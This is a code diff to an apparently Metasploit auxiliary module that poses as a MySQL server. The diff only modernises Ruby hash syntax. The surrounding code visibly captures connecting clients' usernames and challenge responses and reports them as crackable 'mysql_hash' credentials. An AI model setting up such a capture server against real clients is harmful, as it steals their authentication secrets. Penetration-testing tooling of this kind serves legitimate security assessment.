@@ -54,9 +54,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_client_connect(c)
     @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
     }
     mysql_send_greeting(c)
   end
@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def on_client_data(c)
-    info = { :errors => [] }
+    info = { errors: [] }
     data = c.get_once
     return if not data
 
@@ -145,15 +145,15 @@ class Metasploit3 < Msf::Auxiliary
       end
       hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack("H*")[0]}$#{info[:response].unpack('H*')[0]}"
       report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'mysql_client',
-        :user => info[:username],
-        :pass => hash_line,
-        :type => "mysql_hash",
-        :proof => info[:database] ? info[:database] : hash_line,
-        :source_type => "captured",
-        :active => true
+        host: c.peerhost,
+        port: datastore['SRVPORT'],
+        sname: 'mysql_client',
+        user: info[:username],
+        pass: hash_line,
+        type: "mysql_hash",
+        proof: info[:database] ? info[:database] : hash_line,
+        source_type: "captured",
+        active: true
       )
 
       if (datastore['CAINPWFILE'])
